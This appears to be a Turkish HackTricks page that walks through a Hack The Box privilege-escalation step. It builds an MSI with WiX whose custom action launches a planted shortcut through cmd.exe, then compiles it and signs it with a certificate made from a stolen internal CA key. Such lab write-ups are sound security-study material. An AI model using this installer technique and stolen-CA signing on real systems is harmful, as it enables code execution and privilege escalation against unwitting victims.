# WiX ile Özel Eylem MSI'ı Oluşturma

{{#include ../../banners/hacktricks-training.md}}

Bu tarihsel Hack The Box zincirinde, daha önce yerleştirilmiş bir `.lnk` dosyasını başlatan bir MSI oluşturmak için WiX Toolset v3 kullanılmıştır. **Bir MSI otomatik olarak ayrıcalıklı değildir**: çalıştırma, Windows Installer policy, custom-action attributes ve kurulumu gerçekleştiren kişiye göre belirlenen bağlamda gerçekleşir. Belirtilen senaryoda attacker ayrıca güvenilir bir signing CA'yı çalmış ve imzalı MSI'ı başka bir kullanıcı tarafından izlenen bir klasöre yerleştirmiştir.<sup>[[1]](#references)[[3]](#references)</sup>

wix MSI kullanım örneklerini kapsamlı şekilde anlamak için [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) başvurulması önerilir. Burada wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.<sup>[[2]](#references)</sup>

MSI, `C:\Users\Public\Desktop\Shortcuts\rick.lnk` dosyasını çalıştırır. Orijinal WiX v3 XML'i aşağıda korunmuştur:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion`, minimum Windows Installer sürümünü belirtir ve `Compressed="yes"` paketin sıkıştırılmış olarak işaretlenmesini sağlar. `Stage1` deferred durumundadır ancak `Impersonate="yes"` özelliğine sahiptir; bu nedenle yüklemeyi yapan kullanıcının impersonated token'ı ile çalışır. Bu senaryodaki privilege değişikliği, bu özniteliğin sihirli bir şekilde SYSTEM yetkisi vermesinden değil, MSI'ı daha sonra açan privileged user'dan kaynaklanmıştır.<sup>[[3]](#references)</sup>

Kaynağı `candle.exe` ile bir WiX object'e derleyin:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Bu nesneyi `light.exe` ile bir MSI'a bağlayın:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Original zincirde kullanılan imzalama adımı

Hedef iş akışı, güvenliği ihlal edilmiş bir internal CA tarafından imzalanan paketleri kabul ediyordu. Write-up'ta, kurtarılan `MyCA.cer`/`MyCA.pvk` dosyalarından bir signing certificate türetildi, bir PFX oluşturuldu ve MSI imzalandı:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Saldırgan daha sonra imzalanmış paketi `D:\DEV\MSIs` konumuna yerleştirdi ve ayrıcalıklı workflow/kullanıcının paketi çalıştırmasını bekledi. Tekniği uyarlarken bu ön koşulu koruyun: yükseltilmiş bir installation path, `AlwaysInstallElevated` gibi unsafe bir policy veya ayrıcalıklı bir victim olmadan bu paket yalnızca mevcut kullanıcının yetkileriyle çalışır.

## References

- [1] [Hack The Box - Ethereal: Kötü amaçlı msi oluşturma ve root elde etme - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Kısa bir giriş: WiX ile MSI installer oluşturma - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Ertelenmiş yürütme custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
